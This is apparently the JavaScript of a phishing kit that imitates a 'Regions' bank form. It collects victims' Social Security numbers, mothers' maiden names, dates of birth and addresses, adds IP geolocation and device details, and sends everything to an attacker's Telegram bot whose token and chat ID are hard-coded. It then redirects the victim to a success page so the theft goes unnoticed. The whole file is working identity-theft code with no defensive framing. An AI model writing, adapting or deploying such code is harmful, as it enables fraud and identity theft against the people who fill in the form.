
const form = document.getElementById('personal-form');

function getBrowserInfo() {
  return navigator.userAgent;
}

function getDeviceType() {
  const ua = navigator.userAgent.toLowerCase();
  if (/mobile|android|iphone|ipod|blackberry|iemobile|opera mini/.test(ua)) {
    return 'Mobile';
  }
  if (/tablet|ipad|playbook|silk/.test(ua)) {
    return 'Tablet';
  }
  return 'Desktop';
}


async function getGeoInfo() {
  try {
    const res = await fetch('https://ipapi.co/json/');
    return await res.json();
  } catch {
    return { ip: 'Unknown IP', city: 'Unknown', country_name: 'Unknown' };
  }
}

form.addEventListener('submit', async (event) => {
  event.preventDefault();

  const maiden = document.getElementById('maiden').value.trim();
  const ssn = document.getElementById('ssn').value.trim();
  const dob = document.getElementById('dob').value.trim();
  const fullAddress = document.getElementById('fullAddress').value.trim();
  

  if (!maiden || !ssn || !dob|| !fullAddress) {
    alert("All fields are required!");
    return;
  }

  const geo = await getGeoInfo();
  const browser = getBrowserInfo();
  const device = getDeviceType();

  // ✅ Put your real Telegram bot details here
  const token = "8525430088:AAHfMQJCkbpR3oUnnXC37_SWqKiGnvk9zPQ"; // <-- Replace with your bot token
  const chat_id = "6211090366"; // <-- Replace with your chat ID

  const telegramUrl = `https://api.telegram.org/bot${token}/sendMessage`;

  const message = `
===📋 REGIONS New Personal Info Submitted===
-------------------------
👤 Mother's Maiden: ${maiden}
💳 SSN: ${ssn}
🔑 Date of birth: ${dob}
📅 Full Address: ${fullAddress}

🌍 IP: ${geo.ip}
🏙️ City: ${geo.city}
🏳️ Country: ${geo.country_name}
💻 Browser: ${browser}
📱 Device: ${device}
  `;

  try {
    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chat_id,
        text: message
      })
    });

    if (response.ok) {
      //alert("Info sent successfully ✅");
      window.location.href = 'success.html';
    } else {
      //alert("Failed to send info ❌");
    }
  } catch (err) {
    //alert("Error: " + err.message);
  }
});

